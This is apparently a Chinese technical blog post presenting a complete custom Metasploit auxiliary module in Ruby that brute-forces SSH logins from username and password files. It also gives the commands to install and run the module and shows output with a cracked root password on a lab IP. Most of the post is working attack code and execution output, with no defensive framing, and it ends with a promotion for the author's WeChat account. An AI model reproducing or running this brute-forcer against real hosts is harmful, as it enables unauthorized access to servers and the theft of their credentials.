---
layout: post
category: binghe-code-hack
title: Metasploit自定义SSH认证暴力破解器
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: Metasploit自定义SSH认证暴力破解器
lock: need
---

# Metasploit自定义SSH认证暴力破解器

这里，我们首先编写一个脚本ssh_brute_by_binghe.rb，具体如下：

```
##
# Author 冰河
# Date 2019-01-12
# Description 自定义SSH暴力破解模块，用于暴力破解SSH
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/ssh'

class Metasploit3 < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  #提供必要的暴力破解机制和功能，例如提供了单独的登录用户名和密码表，生词表、空密码等选项
  include Msf::Auxiliary::AuthBrute
  
  #初始化基础信息
  def initialize
    super(
      'Name'        => 'SSH Scanner',
      'Description' => %q{
        SSH Brute Tool
      },
      'Author'      => 'binghe',
      'License'     => MSF_LICENSE
    )
   register_options(
   [
      Opt::RPORT(22)
   ],self.class)
   end
   
   def run_host(ip)
     #cred_collection实现了按照数据存储选项来设置登录凭证
     cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: datastore['BLANK_PASSWORDS'],
        pass_file: datastore['PASS_FILE'],
        password: datastore['PASSWORD'],
        user_file: datastore['USER_FILE'],
        userpass_file: datastore['USERPASS_FILE'],
        username: datastore['USERNAME'],
        user_as_pass: datastore['USER_AS_PASS'],
     )
     
     scanner = Metasploit::Framework::LoginScanner::SSH.new(
        host: ip,
        port: datastore['PORT'],
        cred_details: cred_collection,
        proxies: datastore['Proxies'],
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: datastore['SSH_TIMEOUT'],
        framework: framework,
        framework_module: self,
     )
     
     #使用.scan实现扫描的初始化，它将完成所有的登录尝试
     scanner.scan! do |result|
        #to_h 将数据转换成哈希格式
        credential_data = result.to_h
        #将名字和工作区id合并到credential_data变量中
        credential_data.merge!(
            module_fullname: self.fullname,
            workspace_id: myworkspace_id
        )
        
        #登录凭证正确，保存到数据库，并打印信息
        if result.success?
          credential_core = create_credential(credential_data)
          credential_data[:core] = credential_core
          create_credential_login(credential_data)
          
          print_good "#{ip} - LOGIN SUCCESSFUL: #{result.credential}"
          
        #登录凭证不正确，将credential_data传入到invalidate_login方法，并打印信息
        else
          invalidate_login(credential_data)
          print_status "#{ip} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
        end
      end     
   end
end
```

接下来我们将ssh_brute_by_binghe.rb上传到Kali的/usr/share/metasploit-framework/modules/auxiliary/scanner/ssh目录下。

在运行这个脚本之前，我们先使用Metasploit中的msftidy工具检查一下此脚本的语法是否正确。

在Kali的命令行执行如下命令：

```
/usr/share/metasploit-framework/tools/dev/msftidy.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/ssh/ssh_brute_by_binghe.rb 
```

未输出任何信息，证明脚本正确。

接下来，我们在msf终端运行ssh_brute_by_binghe.rb脚本

```
msfconsole
set RHOSTS 192.168.109.159
set USER_FILE /root/user
set PASS_FILE /root/pass
run
```

最终输出结果为：

```
[*] 192.168.109.159 - LOGIN FAILED: root:admin (Incorrect: )
[+] 192.168.109.159 - LOGIN SUCCESSFUL: root:admin123
[*] 192.168.109.159 - LOGIN FAILED: admin:123456 (Incorrect: )
[*] 192.168.109.159 - LOGIN FAILED: admin:admin (Incorrect: )
[*] 192.168.109.159 - LOGIN FAILED: admin:binghe (Incorrect: )
[*] 192.168.109.159 - LOGIN FAILED: binghe:123456 (Incorrect: )
[*] 192.168.109.159 - LOGIN FAILED: binghe:admin (Incorrect: )
[*] 192.168.109.159 - LOGIN FAILED: binghe:binghe (Incorrect: )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


## 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)